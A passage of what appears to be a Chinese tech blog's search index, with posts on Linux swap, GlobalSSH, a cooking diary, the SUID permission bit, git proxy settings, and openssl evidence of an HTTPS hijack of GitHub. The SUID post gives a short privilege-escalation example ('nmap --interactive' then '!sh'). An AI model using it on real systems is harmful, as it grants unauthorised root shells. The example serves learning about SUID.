也可以通过free命令来查看 free -h ","date":"2020-04-12","objectID":"https://zu1k.com/posts/linux/linux-add-swap/:1:0","series":null,"tags":["linux","swap"],"title":"Linux添加swap","uri":"https://zu1k.com/posts/linux/linux-add-swap/#查看当前swap"},{"categories":["coding"],"content":"添加swap 添加swap基本步骤： 创建一个大文件 -\u003e 初始化文件为swap交换文件格式 -\u003e 启用这个文件 ","date":"2020-04-12","objectID":"https://zu1k.com/posts/linux/linux-add-swap/:2:0","series":null,"tags":["linux","swap"],"title":"Linux添加swap","uri":"https://zu1k.com/posts/linux/linux-add-swap/#添加swap"},{"categories":["coding"],"content":"创建大文件 先找一个剩余空间大点的地方创建一个大文件，这里以1G的大小为例，一般swap空间大小以真实物理内存1-2倍大小 # 我喜欢用的方法，速度快 sudo fallocate -l 1G /swapfile # 如果没有安装可以用dd命令，比较慢 sudo dd if=/dev/zero of=/swapfile bs=1024 count=1048576 修改文件的权限 sudo chmod 600 /swapfile ","date":"2020-04-12","objectID":"https://zu1k.com/posts/linux/linux-add-swap/:2:1","series":null,"tags":["linux","swap"],"title":"Linux添加swap","uri":"https://zu1k.com/posts/linux/linux-add-swap/#创建大文件"},{"categories":["coding"],"content":"初始化文件 创建完文件后需要将文件进行初始化，标记为swap文件格式 sudo mkswap /swapfile ","date":"2020-04-12","objectID":"https://zu1k.com/posts/linux/linux-add-swap/:2:2","series":null,"tags":["linux","swap"],"title":"Linux添加swap","uri":"https://zu1k.com/posts/linux/linux-add-swap/#初始化文件"},{"categories":["coding"],"content":"启用swap 接下来使用 命令启用这个swap交换文件 sudo swapon /swapfile 要让创建好的 swap 分区永久生效，可以将 swapfile 路径内容写入到 /etc/fstab 文件当中： /swapfile swap swap defaults 0 0 ","date":"2020-04-12","objectID":"https://zu1k.com/posts/linux/linux-add-swap/:2:3","series":null,"tags":["linux","swap"],"title":"Linux添加swap","uri":"https://zu1k.com/posts/linux/linux-add-swap/#启用swap"},{"categories":["coding"],"content":"检查 用一开始的命令检查一下swap是否启用正常 ","date":"2020-04-12","objectID":"https://zu1k.com/posts/linux/linux-add-swap/:2:4","series":null,"tags":["linux","swap"],"title":"Linux添加swap","uri":"https://zu1k.com/posts/linux/linux-add-swap/#检查"},{"categories":["coding"],"content":"移除SWAP分区 根据添加的顺序反着来就行： 取消swap -\u003e 删除swap分页文件 ","date":"2020-04-12","objectID":"https://zu1k.com/posts/linux/linux-add-swap/:3:0","series":null,"tags":["linux","swap"],"title":"Linux添加swap","uri":"https://zu1k.com/posts/linux/linux-add-swap/#移除swap分区"},{"categories":["coding"],"content":"取消swap 首先输入以下命令停用 SWAP 空间： sudo swapoff -v /swapfile 在 /etc/fstab 文件中删除有效 swap 的行。 ","date":"2020-04-12","objectID":"https://zu1k.com/posts/linux/linux-add-swap/:3:1","series":null,"tags":["linux","swap"],"title":"Linux添加swap","uri":"https://zu1k.com/posts/linux/linux-add-swap/#取消swap"},{"categories":["coding"],"content":"删除文件 最后执行以下命令删除 swapfile 文件： sudo rm /swapfile ","date":"2020-04-12","objectID":"https://zu1k.com/posts/linux/linux-add-swap/:3:2","series":null,"tags":["linux","swap"],"title":"Linux添加swap","uri":"https://zu1k.com/posts/linux/linux-add-swap/#删除文件"},{"categories":["coding"],"content":"调整Swappiness值 Swappiness 是一个 Linux 内核属性，用于定义 Linux 系统使用 SWAP 空间的频率。Swappiness 值可以从 0 至 100，较低的值会让内核尽可能少的使用 SWAP 空间，而较高的值将让 Linux Kernel 能够更加积极地使用 SWAP 分区。 Ubuntu 18.04 默认的 Swappiness 值为 60，您可以使用如下命令来查看： cat /proc/sys/vm/swappiness 值为 60 对于 Ubuntu 18.04 桌面还算行，但对于 Ubuntu Server 来说，SWAP 的使用频率就比较高了，所以您可能需要设置较低的值。例如，要将 swappiness 值设置为 40，请执行： sudo sysctl vm.swappiness=40 如果要让设置在系统重启后依然有效，则必要在 /etc/sysctl.conf 文件中添加以下内容： vm.swappiness=40 最佳 swappiness 值取决于您系统的工作负载以及内存的使用方式，您应该以小增量的方式来调整此参数，以查到最佳值。 ","date":"2020-04-12","objectID":"https://zu1k.com/posts/linux/linux-add-swap/:4:0","series":null,"tags":["linux","swap"],"title":"Linux添加swap","uri":"https://zu1k.com/posts/linux/linux-add-swap/#调整swappiness值"},{"categories":["coding"],"content":"UCloud已经对加速IP进行限制，本文中的方法即时失效 通知内容如下： 尊敬的UCloud用户，您好！ GlobalSSH产品即日起将暂时限制服务器IP地址范围， 仅允许添加UCloud平台上的IP地址，已创建的资源仍然可继续使用。 GlobalSSH版本与功能支持将持续更新，敬请关注。 由于众所周知的原因，很多国外的服务器在国内的访问效果很差，特别是国内比较热门的廉价服务器例如 Vultr 就经常被墙直接无法访问 通常情况下我会使用ssr等代理服务进行中转，在我经常使用的 MobaXterm 中设置起来也非常方便 但是这种方法有两大劣势： 如果科学上网服务器不稳定经常断流就会导致ssh连接断开 部分客户端不支持设置http或者socks代理 ","date":"2020-04-12","objectID":"https://zu1k.com/posts/coding/use-ucloud-globalssh-to-speedup-server-ssh/:0:1","series":null,"tags":["ucloud","ssh"],"title":"使用GlobalSSH服务加速境外服务器ssh访问","uri":"https://zu1k.com/posts/coding/use-ucloud-globalssh-to-speedup-server-ssh/#ucloud已经对加速ip进行限制本文中的方法即时失效"},{"categories":["coding"],"content":"GlobalSSH 今天发现了一个免费的加速服务，非常方便，推荐给需要的人 这就是 UCloud 免费提供的 GlobalSSH 加速服务 官网链接： https://console.ucloud.cn/upathx/globalssh 官方文档： https://docs.ucloud.cn/pathx/globalssh 这项服务目前是免费的，也不需要进行实名认证 现在需要实名认证才能用了，可以说是非常良心了，经过我的试用，访问速度和稳定性非常不错 支持ssh和rdp远程桌面，猜测有一些其他的服务可以加速，因为是针对端口加速的，但是如果滥用的话可能被封禁 在创建的时候只需要输入需要加速的国外服务器的ip和服务端口号，选择一个离服务器近的接入点 创建之后会提供一个域名，可以将自己的域名CNAME解析到提供的域名上方便记忆，UCLOUD可以准确识别到是访问哪一台服务器 在我们使用的客户端上只需要用提供的加速域名和原服务端口号就可以了 ","date":"2020-04-12","objectID":"https://zu1k.com/posts/coding/use-ucloud-globalssh-to-speedup-server-ssh/:1:0","series":null,"tags":["ucloud","ssh"],"title":"使用GlobalSSH服务加速境外服务器ssh访问","uri":"https://zu1k.com/posts/coding/use-ucloud-globalssh-to-speedup-server-ssh/#globalssh"},{"categories":["coding"],"content":"注意事项 自产品实例创建之日起，7日内单个实例累计出向流量小于2MB，加速功能将被停用，所以一开始先多用点吧 每个源IP只能加速一个端口 加速流量上限官方未注明，滥用的话会被封 ","date":"2020-04-12","objectID":"https://zu1k.com/posts/coding/use-ucloud-globalssh-to-speedup-server-ssh/:2:0","series":null,"tags":["ucloud","ssh"],"title":"使用GlobalSSH服务加速境外服务器ssh访问","uri":"https://zu1k.com/posts/coding/use-ucloud-globalssh-to-speedup-server-ssh/#注意事项"},{"categories":["coding"],"content":"妙用 众所周知，github在国内的访问速度很慢，有时候clone一个库不得不忍受十几k几十k每秒的速度 而git是可以用ssh协议的，所以我们只需要从 https://api.github.com/meta 找到github使用的ip，通过GlobalSSH加速22端口，然后将自己的域名解析到加速的ip，最后使用自己的域名clone就行了 经过我的尝试效果还不错，可以跑到10Mbps 我用的域名为 githubssh.xyz ，大家可以拿去用，使用方法如下： 原命令 git clone git@github.com:moby/moby.git 替换后 git clone git@githubssh.xyz:moby/moby.git 为了能够自动更新ip，我写了一个程序，每天会检查github新的ip，创建新的globalssh，然后自动解析到域名githubssh.xyz上，由cloudflare进行DNS层面的负载均衡 开源地址为： https://github.com/zu1k/globalssh4github 同时为了方便，改了一个插件： https://chrome.google.com/webstore/detail/github%E5%8A%A0%E9%80%9F/kejahdakjmkfddgnifodfnpcklckjjpo ","date":"2020-04-12","objectID":"https://zu1k.com/posts/coding/use-ucloud-globalssh-to-speedup-server-ssh/:3:0","series":null,"tags":["ucloud","ssh"],"title":"使用GlobalSSH服务加速境外服务器ssh访问","uri":"https://zu1k.com/posts/coding/use-ucloud-globalssh-to-speedup-server-ssh/#妙用"},{"categories":["life"],"content":" 这应该是我第一篇记录生活的博文吧，之前一直是写一些学习、技术相关的文章，总感觉博客不应该只记录这些东西，那就开始吧 妈妈从网上买了几斤红薯，今天突然说想吃，那就用烤箱烤一下吧 ","date":"2020-03-31","objectID":"https://zu1k.com/posts/life/bake-sweet-potato/:0:0","series":null,"tags":["Cooking"],"title":"烤红薯","uri":"https://zu1k.com/posts/life/bake-sweet-potato/#"},{"categories":["life"],"content":"准备 烤盘铺上锡纸（哑光面接触食物），红薯洗净不去皮，均匀的摆放到烤盘上 烤箱230度预热10分钟后就可以将烤盘放入了 ","date":"2020-03-31","objectID":"https://zu1k.com/posts/life/bake-sweet-potato/:1:0","series":null,"tags":["Cooking"],"title":"烤红薯","uri":"https://zu1k.com/posts/life/bake-sweet-potato/#准备"},{"categories":["life"],"content":"第一波 230度先烤30分钟，呼叫小爱：“小爱同学，30分钟后叫我” 30分钟不到（大约20多分钟吧）就闻到红薯的香气飘出来了，香啊 30分钟后打开烤箱，用夹子夹着给每个红薯翻个个 烤了半个小时的红薯朝上的那面有点软，但是没有怎么变色，接触锡纸的一面有点变黑了，焦感出来了 翻完个后拍了三张照片，可以看到整体还是不错的，火候还不到，有的地方已经流出油来了 ","date":"2020-03-31","objectID":"https://zu1k.com/posts/life/bake-sweet-potato/:2:0","series":null,"tags":["Cooking"],"title":"烤红薯","uri":"https://zu1k.com/posts/life/bake-sweet-potato/#第一波"},{"categories":["life"],"content":"第二波 鉴于红薯个比较大，翻个后时间增加到45分钟，接着烤 中途没忍住，打开拍了一张照片，流了很多油啊，接触到烤盘发出滋滋的响声，很是诱人 ","date":"2020-03-31","objectID":"https://zu1k.com/posts/life/bake-sweet-potato/:3:0","series":null,"tags":["Cooking"],"title":"烤红薯","uri":"https://zu1k.com/posts/life/bake-sweet-potato/#第二波"},{"categories":["life"],"content":"出炉 时间到，啥也不说了，直接看图吧 超级好吃，超级甜，超级香 ","date":"2020-03-31","objectID":"https://zu1k.com/posts/life/bake-sweet-potato/:4:0","series":null,"tags":["Cooking"],"title":"烤红薯","uri":"https://zu1k.com/posts/life/bake-sweet-potato/#出炉"},{"categories":["life"],"content":"补充 这次因为是第一次烤，烤的时间稍微有点长，流出来太多油浪费了，还有一些油都烤糊了，下次会缩短一点时间 ","date":"2020-03-31","objectID":"https://zu1k.com/posts/life/bake-sweet-potato/:5:0","series":null,"tags":["Cooking"],"title":"烤红薯","uri":"https://zu1k.com/posts/life/bake-sweet-potato/#补充"},{"categories":["coding"],"content":"什么是SUID SUID简称位，英文全称是Set owner User ID up on execution，它是一种特殊的文件权限，能够让用户(如Bob)用其他用户(如root用户)的权限运行一个程序，而不需要用sudo进行临时提权 同一类的还有SGID，就不详细说了，原理与SUID一样，就以SUID为例 在一个程序执行的时候会有三个ID状态，在深入学习SUID之前必须能够区分下面三种ID： Real User ID Effective User ID Saved User ID Real User ID 是执行这个程序的用户的真实ID，是已用户login时候的ID为准 Effective User ID 是程序执行过程中使用权限时真正起作用的用户ID，操作系统在检查一个程序有没有某个权限的时候会看这个ID Saved User ID 是程序临时提权时需要保存的先前的用户ID，等提权结束后需要回退到这个用户ID ","date":"2020-03-30","objectID":"https://zu1k.com/posts/linux/linux-suid/:1:0","series":null,"tags":["linux","suid","coding"],"title":"学习Linux中的SUID机制","uri":"https://zu1k.com/posts/linux/linux-suid/#什么是suid"},{"categories":["coding"],"content":"SUID的作用 如果用户user2有另一个用户user1的程序的执行权限，并且user1给这个程序设置了SUID位，那么user2就可以用user1的权限来执行这个程序 简单来说，SUID能够让用户(如Bob)用其他用户(如root用户)的权限运行一个程序，而不需要用sudo进行临时提权 举个例子： 所有用户的密码保存在 /etc/shadow 文件中，但是这个文件只有root用户能够进行写操作 root@kali:~# ls -l /etc/shadow -rw-r----- 1 root shadow 1639 Jan 27 12:50 /etc/shadow 那如果普通用户想要修改自己的密码，是否需要让root用户帮着修改呢？ 显然不需要，修改密码用到了 /usr/bin/passwd 这个程序，我们来看一下它的权限 root@kali:~# ls -l /usr/bin/passwd -rwsr-xr-x 1 root root 63944 Dec 20 10:39 /usr/bin/passwd 可以看到，这个程序的所有者是root用户，但是所有用户都有执行权限，并且设置了s位（怎么看出来的后面会说） 这样SUID机制就会在程序执行的时候发生作用，让普通用户可以用root权限修改/etc/shadow文件 SUID机制的存在使程序权限的控制更加方便，用户可以执行某个程序而不需要登录到程序拥有者的账号 ","date":"2020-03-30","objectID":"https://zu1k.com/posts/linux/linux-suid/:2:0","series":null,"tags":["linux","suid","coding"],"title":"学习Linux中的SUID机制","uri":"https://zu1k.com/posts/linux/linux-suid/#suid的作用"},{"categories":["coding"],"content":"如何使用SUID ","date":"2020-03-30","objectID":"https://zu1k.com/posts/linux/linux-suid/:3:0","series":null,"tags":["linux","suid","coding"],"title":"学习Linux中的SUID机制","uri":"https://zu1k.com/posts/linux/linux-suid/#如何使用suid"},{"categories":["coding"],"content":"查看SUID 通过命令 ls -l 即可看到文件的详细信息，包括权限表 -rwxrwxrwx - rwx rwx rwx 第一位是文件类型，-就是普通文件，d代表目录，l代表链接文件，还有一些其他类型的文件不详细说了 后面的9位可以分成三组，分别表示所有者权限、同组内用户权限，组外其他用户权限 每一组都有三位，r 代表有读取权限，w 代表有写入权限，x 代表有执行权限，如果是 _ 就代表没有相应的权限 如果文件所有者权限的 x 换成 s 就代表设置了SUID 同理如果组内用户权限的 x 换成了 s 就代表设置了SGID ","date":"2020-03-30","objectID":"https://zu1k.com/posts/linux/linux-suid/:3:1","series":null,"tags":["linux","suid","coding"],"title":"学习Linux中的SUID机制","uri":"https://zu1k.com/posts/linux/linux-suid/#查看suid"},{"categories":["coding"],"content":"设置SUID 使用 chmod 4000 filename 可以设置SUID位 使用 chmod 2000 filename 可以设置SGID位 使用 chmod 6000 filename 可以同时设置SGID和SUID位 注意: 2000\\4000\\6000都是不完整的权限，正常使用应该将000替换为相应的权限，例如 4755 ","date":"2020-03-30","objectID":"https://zu1k.com/posts/linux/linux-suid/:3:2","series":null,"tags":["linux","suid","coding"],"title":"学习Linux中的SUID机制","uri":"https://zu1k.com/posts/linux/linux-suid/#设置suid"},{"categories":["coding"],"content":"取消SUID 使用 chmod 755 filename 可以取消SGID和SUID位 或者 chmod u-s filename or chmod g-s filename 也可以 ","date":"2020-03-30","objectID":"https://zu1k.com/posts/linux/linux-suid/:3:3","series":null,"tags":["linux","suid","coding"],"title":"学习Linux中的SUID机制","uri":"https://zu1k.com/posts/linux/linux-suid/#取消suid"},{"categories":["coding"],"content":"SUID提权 因为SUID位让程序在执行的时候有了所有者的权限，所以可以利用这点来提权 示例： # 进入nmap的交互模式 nmap --interactive # 执行sh，提权成功 !sh 详细介绍见： https://www.leavesongs.com/PENETRATION/linux-suid-privilege-escalation.html ","date":"2020-03-30","objectID":"https://zu1k.com/posts/linux/linux-suid/:4:0","series":null,"tags":["linux","suid","coding"],"title":"学习Linux中的SUID机制","uri":"https://zu1k.com/posts/linux/linux-suid/#suid提权"},{"categories":["coding"],"content":"SUID在脚本中失效 假如user1用 chmod 4777 /home/user1/script.sh 命令给script.sh脚本设置SUID位，登录user2后执行这个脚本提示没有权限 这是因为SUID位只对编译过的可执行程序起作用，sh脚本的实际执行程序是sh或者bash之类，如果它们在执行的时候并不会检查脚本文件的SUID位，那就不会起作用了 Perl执行器会检查perl脚本的suid位，所以可以给pl脚本设置suid位 ","date":"2020-03-30","objectID":"https://zu1k.com/posts/linux/linux-suid/:5:0","series":null,"tags":["linux","suid","coding"],"title":"学习Linux中的SUID机制","uri":"https://zu1k.com/posts/linux/linux-suid/#suid在脚本中失效"},{"categories":["coding"],"content":"近期，Github的直连速度一直不理想，甚至被墙或者MITM，最好的解决办法就是挂代理 Git 可以使用四种不同的协议来传输资料：本地协议（Local），HTTP 协议，SSH（Secure Shell）协议及 Git 协议 而我们平时使用github一般使用两种协议，一种是http协议，另一种是ssh协议，针对这两种协议有两种不同的代理设置办法 ","date":"2020-03-27","objectID":"https://zu1k.com/posts/coding/set-proxy-for-git/:0:0","series":null,"tags":["proxy","github","git"],"title":"给git设置代理","uri":"https://zu1k.com/posts/coding/set-proxy-for-git/#"},{"categories":["coding"],"content":"http协议 通常使用的链接形如：https://github.com/git/git.git 针对这种协议，代理设置比较简单 # http或https代理 git config --global http.proxy http://127.0.0.1:7890 git config --global https.proxy http://127.0.0.1:7890 # 取消代理 git config --global --unset http.proxy git config --global --unset https.proxy ","date":"2020-03-27","objectID":"https://zu1k.com/posts/coding/set-proxy-for-git/:1:0","series":null,"tags":["proxy","github","git"],"title":"给git设置代理","uri":"https://zu1k.com/posts/coding/set-proxy-for-git/#http协议"},{"categories":["coding"],"content":"ssh协议 通常使用的链接形如：git@github.com:git/git.git 或者 ssh://[\u003cusername\u003e@]\u003cserver\u003e[:\u003cport\u003e]/path/repo.git 对于使用ssh协议的库，上面的代理设置办法就失效了，需要给ssh设置socks代理 在 ~/.ssh/config 文件中添加下面内容， 如果没有这个文件就新建 Host github.com ProxyCommand nc -X 5 -x 127.0.0.1:1080 %h %p 这里使用的是nc命令，linux需要安装netcat(一般自带了)，windows需要单独下载 windows如果安装了mingw也可以使用connect命令来替代nc命令 Host github.com ProxyCommand connect -S 127.0.0.1:1080 %h %p ","date":"2020-03-27","objectID":"https://zu1k.com/posts/coding/set-proxy-for-git/:2:0","series":null,"tags":["proxy","github","git"],"title":"给git设置代理","uri":"https://zu1k.com/posts/coding/set-proxy-for-git/#ssh协议"},{"categories":["event"],"content":"昨天下午两点多，突然在一个站长群里听到有人说 Github Pages 的证书大批量出现错误，不一会就在V2EX上看到相关讨论的帖子 当天晚上再次刷V2EX的时候发现部分cloudflare的IP和京东主站部分IP也出现相似的劫持事件 今天早晨8点左右，在V2EX上发现有人讨论 Github 主站出现相同的https劫持，不经过代理访问发现证书的确异常 查看证书详情 ","date":"2020-03-27","objectID":"https://zu1k.com/posts/events/mitm-https-hijack-github/:0:0","series":null,"tags":["GitHub","中间人"],"title":"Github等大面积https劫持","uri":"https://zu1k.com/posts/events/mitm-https-hijack-github/#"},{"categories":["event"],"content":"检查Github证书 这里我通过北京和香港两台阿里云主机，使用openssl提供的方法查看证书详细内容 命令为: openssl s_client -showcerts -connect github.com:443 \u003c /dev/null ","date":"2020-03-27","objectID":"https://zu1k.com/posts/events/mitm-https-hijack-github/:1:0","series":null,"tags":["GitHub","中间人"],"title":"Github等大面积https劫持","uri":"https://zu1k.com/posts/events/mitm-https-hijack-github/#检查github证书"},{"categories":["event"],"content":"北京阿里云 点击展开 ➜ ~ openssl s_client -showcerts -connect github.com:443 \u003c /dev/null CONNECTED(00000003) depth=1 C = CN, ST = GD, L = SZ, O = COM, OU = NSP, CN = CA, emailAddress = 346608453@qq.com verify error:num=19:self signed certificate in certificate chain verify return:1 depth=1 C = CN, ST = GD, L = SZ, O = COM, OU = NSP, CN = CA, emailAddress = 346608453@qq.com verify return:1 depth=0 C = CN, ST = GD, L = SZ, O = COM, OU = NSP, CN = SERVER, emailAddress = 346608453@qq.com verify return:1 --- Certificate chain 0 s:C = CN, ST = GD, L = SZ, O = COM, OU = NSP, CN = SERVER, emailAddress = 346608453@qq.com i:C = CN, ST = GD, L = SZ, O = COM, OU = NSP, CN = CA, emailAddress = 346608453@qq.com -----BEGIN CERTIFICATE----- MIIB4TCCAYcCFDjGwZUOfrr1+SWHR5GxJ/rwXsHZMAoGCCqGSM49BAMCMHExCzAJ BgNVBAYTAkNOMQswCQYDVQQIDAJHRDELMAkGA1UEBwwCU1oxDDAKBgNVBAoMA0NP TTEMMAoGA1UECwwDTlNQMQswCQYDVQQDDAJDQTEfMB0GCSqGSIb3DQEJARYQMzQ2 NjA4NDUzQHFxLmNvbTAeFw0xOTA5MjYwOTMzMTNaFw0yOTA5MjMwOTMzMTNaMHUx CzAJBgNVBAYTAkNOMQswCQYDVQQIDAJHRDELMAkGA1UEBwwCU1oxDDAKBgNVBAoM A0NPTTEMMAoGA1UECwwDTlNQMQ8wDQYDVQQDDAZTRVJWRVIxHzAdBgkqhkiG9w0B CQEWEDM0NjYwODQ1M0BxcS5jb20wWTATBgcqhkjOPQIBBggqhkjOPQMBBwNCAASJ 27aMaVclvmdT8m6l98K999FM4dYTg4ag0627S2bxbLYHyLdQ0jqay5kA9KCF9Ucw uzcqtTrNERlLIsxDGkLjMAoGCCqGSM49BAMCA0gAMEUCIH1+jEiQTVA+siP2g9kw ITFZZINVKyET48788OSCLK1hAiEA+c5bJvnrdtZ1rbsLXJWtglkXSeBaHy5Wdt7w dGc7McM= -----END CERTIFICATE----- 1 s:C = CN, ST = GD, L = SZ, O = COM, OU = NSP, CN = CA, emailAddress = 346608453@qq.com i:C = CN, ST = GD, L = SZ, O = COM, OU = NSP, CN = CA, emailAddress = 346608453@qq.com -----BEGIN CERTIFICATE----- MIICNzCCAd2gAwIBAgIUD6UJah0ReDrJIuxhqrTa0CAAbAMwCgYIKoZIzj0EAwIw cTELMAkGA1UEBhMCQ04xCzAJBgNVBAgMAkdEMQswCQYDVQQHDAJTWjEMMAoGA1UE CgwDQ09NMQwwCgYDVQQLDANOU1AxCzAJBgNVBAMMAkNBMR8wHQYJKoZIhvcNAQkB FhAzNDY2MDg0NTNAcXEuY29tMB4XDTE5MDkyNjA5MzIzN1oXDTI5MDkyMzA5MzIz N1owcTELMAkGA1UEBhMCQ04xCzAJBgNVBAgMAkdEMQswCQYDVQQHDAJTWjEMMAoG A1UECgwDQ09NMQwwCgYDVQQLDANOU1AxCzAJBgNVBAMMAkNBMR8wHQYJKoZIhvcN AQkBFhAzNDY2MDg0NTNAcXEuY29tMFkwEwYHKoZIzj0CAQYIKoZIzj0DAQcDQgAE qZ26n2ml6hcyf+NS0TP8PSZ1qlFzUb/tpr6Wb6zE9cSzkGOXej0ddI3sNvq/bLzk LLvaQLEzaIFyRDY6fcSQ36NTMFEwHQYDVR0OBBYEFKv8Ri5sjN4WZoaWvK/h9Yf+ zhVyMB8GA1UdIwQYMBaAFKv8Ri5sjN4WZoaWvK/h9Yf+zhVyMA8GA1UdEwEB/wQF MAMBAf8wCgYIKoZIzj0EAwIDSAAwRQIhANFUxlZxx3dfmxEu1I0huK9eY/IPl6Xz AsUXUQZN2QPXAiACddgQK7I4I86sjPwjCMafPES9LkV/whcFV60LlAftaQ== -----END CERTIFICATE----- --- Server certificate subject=C = CN, ST = GD, L = SZ, O = COM, OU = NSP, CN = SERVER, emailAddress = 346608453@qq.com issuer=C = CN, ST = GD, L = SZ, O = COM, OU = NSP, CN = CA, emailAddress = 346608453@qq.com --- No client certificate CA names sent Peer signing digest: SHA256 Peer signature type: ECDSA Server Temp Key: X25519, 253 bits --- SSL handshake has read 1499 bytes and written 395 bytes Verification error: self signed certificate in certificate chain --- New, TLSv1.2, Cipher is ECDHE-ECDSA-AES128-GCM-SHA256 Server public key is 256 bit Secure Renegotiation IS supported Compression: NONE Expansion: NONE No ALPN negotiated SSL-Session: Protocol : TLSv1.2 Cipher : ECDHE-ECDSA-AES128-GCM-SHA256 Session-ID: 1A4A06D58F5DCC0FA80FFE4125AC12E555126BF8B7C7C627210B9C36F3B5A6ED Session-ID-ctx: Master-Key: 6BD176466BF93E52D592216063276369497FA26AFF0E7343A872FFA6E3F12BFF611BFDA4F5994F297ECC5772EE812305 PSK identity: None PSK identity hint: None SRP username: None TLS session ticket lifetime hint: 7200 (seconds) TLS session ticket: 0000 - 7a 4c 52 3b d5 f6 1c c4-ea 0d 86 45 37 1a 57 c4 zLR;.......E7.W. 0010 - a5 47 0e 76 87 9f f1 68-ac 6c 37 e3 02 87 61 77 .G.v...h.l7...aw 0020 - d9 c5 6a 65 88 3c 44 e5-17 59 5e 30 de 55 51 4a ..je.\u003cD..Y^0.UQJ 0030 - f4 9e 51 c9 35 ee ff a9-62 60 a2 7d 63 fc c1 f9 ..Q.5...b`.}c... 0040 - a4 bf 41 c5 2f 42 9a 7c-6d b0 99 49 63 1c 0f 5c ..A./B.|m..Ic..\\ 0050 - 37 ce 32 85 e6 fb 49 5a-01 97 9d 23 6c c6 9e b3 7.2...IZ...#l... 0060 - 56 dc ae c6 76 cf c6 ba-95 16 c6 c8 57 d1 be c7 V...v.......W... 0070 - d0 a3 f9 66 c6 4e a9 99-52 60","date":"2020-03-27","objectID":"https://zu1k.com/posts/events/mitm-https-hijack-github/:1:1","series":null,"tags":["GitHub","中间人"],"title":"Github等大面积https劫持","uri":"https://zu1k.com/posts/events/mitm-https-hijack-github/#北京阿里云"},{"categories":["event"],"content":"香港阿里云 点击展开 ➜ ~ openssl s_client -showcerts -connect github.com:443 \u003c /dev/null CONNECTED(00000005) depth=2 C = US, O = DigiCert Inc, OU = www.digicert.com, CN = DigiCert High Assurance EV Root CA verify return:1 depth=1 C = US, O = DigiCert Inc, OU = www.digicert.com, CN = DigiCert SHA2 Extended Validation Server CA verify return:1 depth=0 businessCategory = Private Organization, jurisdictionC = US, jurisdictionST = Delaware, serialNumber = 5157550, C = US, ST = California, L = San Francisco, O = \"GitHub, Inc.\", CN = github.com verify return:1 --- Certificate chain 0 s:businessCategory = Private Organization, jurisdictionC = US, jurisdictionST = Delaware, serialNumber = 5157550, C = US, ST = California, L = San Francisco, O = \"GitHub, Inc.\", CN = github.com i:C = US, O = DigiCert Inc, OU = www.digicert.com, CN = DigiCert SHA2 Extended Validation Server CA -----BEGIN CERTIFICATE----- MIIHQjCCBiqgAwIBAgIQCgYwQn9bvO1pVzllk7ZFHzANBgkqhkiG9w0BAQsFADB1 MQswCQYDVQQGEwJVUzEVMBMGA1UEChMMRGlnaUNlcnQgSW5jMRkwFwYDVQQLExB3 d3cuZGlnaWNlcnQuY29tMTQwMgYDVQQDEytEaWdpQ2VydCBTSEEyIEV4dGVuZGVk IFZhbGlkYXRpb24gU2VydmVyIENBMB4XDTE4MDUwODAwMDAwMFoXDTIwMDYwMzEy MDAwMFowgccxHTAbBgNVBA8MFFByaXZhdGUgT3JnYW5pemF0aW9uMRMwEQYLKwYB BAGCNzwCAQMTAlVTMRkwFwYLKwYBBAGCNzwCAQITCERlbGF3YXJlMRAwDgYDVQQF Ewc1MTU3NTUwMQswCQYDVQQGEwJVUzETMBEGA1UECBMKQ2FsaWZvcm5pYTEWMBQG A1UEBxMNU2FuIEZyYW5jaXNjbzEVMBMGA1UEChMMR2l0SHViLCBJbmMuMRMwEQYD VQQDEwpnaXRodWIuY29tMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA xjyq8jyXDDrBTyitcnB90865tWBzpHSbindG/XqYQkzFMBlXmqkzC+FdTRBYyneZ w5Pz+XWQvL+74JW6LsWNc2EF0xCEqLOJuC9zjPAqbr7uroNLghGxYf13YdqbG5oj /4x+ogEG3dF/U5YIwVr658DKyESMV6eoYV9mDVfTuJastkqcwero+5ZAKfYVMLUE sMwFtoTDJFmVf6JlkOWwsxp1WcQ/MRQK1cyqOoUFUgYylgdh3yeCDPeF22Ax8AlQ xbcaI+GwfQL1FB7Jy+h+KjME9lE/UpgV6Qt2R1xNSmvFCBWu+NFX6epwFP/JRbkM fLz0beYFUvmMgLtwVpEPSwIDAQABo4IDeTCCA3UwHwYDVR0jBBgwFoAUPdNQpdag re7zSmAKZdMh1Pj41g8wHQYDVR0OBBYEFMnCU2FmnV+rJfQmzQ84mqhJ6kipMCUG A1UdEQQeMByCCmdpdGh1Yi5jb22CDnd3dy5naXRodWIuY29tMA4GA1UdDwEB/wQE AwIFoDAdBgNVHSUEFjAUBggrBgEFBQcDAQYIKwYBBQUHAwIwdQYDVR0fBG4wbDA0 oDKgMIYuaHR0cDovL2NybDMuZGlnaWNlcnQuY29tL3NoYTItZXYtc2VydmVyLWcy LmNybDA0oDKgMIYuaHR0cDovL2NybDQuZGlnaWNlcnQuY29tL3NoYTItZXYtc2Vy dmVyLWcyLmNybDBLBgNVHSAERDBCMDcGCWCGSAGG/WwCATAqMCgGCCsGAQUFBwIB FhxodHRwczovL3d3dy5kaWdpY2VydC5jb20vQ1BTMAcGBWeBDAEBMIGIBggrBgEF BQcBAQR8MHowJAYIKwYBBQUHMAGGGGh0dHA6Ly9vY3NwLmRpZ2ljZXJ0LmNvbTBS BggrBgEFBQcwAoZGaHR0cDovL2NhY2VydHMuZGlnaWNlcnQuY29tL0RpZ2lDZXJ0 U0hBMkV4dGVuZGVkVmFsaWRhdGlvblNlcnZlckNBLmNydDAMBgNVHRMBAf8EAjAA MIIBfgYKKwYBBAHWeQIEAgSCAW4EggFqAWgAdgCkuQmQtBhYFIe7E6LMZ3AKPDWY BPkb37jjd80OyA3cEAAAAWNBYm0KAAAEAwBHMEUCIQDRZp38cTWsWH2GdBpe/uPT Wnsu/m4BEC2+dIcvSykZYgIgCP5gGv6yzaazxBK2NwGdmmyuEFNSg2pARbMJlUFg U5UAdgBWFAaaL9fC7NP14b1Esj7HRna5vJkRXMDvlJhV1onQ3QAAAWNBYm0tAAAE AwBHMEUCIQCi7omUvYLm0b2LobtEeRAYnlIo7n6JxbYdrtYdmPUWJQIgVgw1AZ51 vK9ENinBg22FPxb82TvNDO05T17hxXRC2IYAdgC72d+8H4pxtZOUI5eqkntHOFeV CqtS6BqQlmQ2jh7RhQAAAWNBYm3fAAAEAwBHMEUCIQChzdTKUU2N+XcqcK0OJYrN 8EYynloVxho4yPk6Dq3EPgIgdNH5u8rC3UcslQV4B9o0a0w204omDREGKTVuEpxG eOQwDQYJKoZIhvcNAQELBQADggEBAHAPWpanWOW/ip2oJ5grAH8mqQfaunuCVE+v 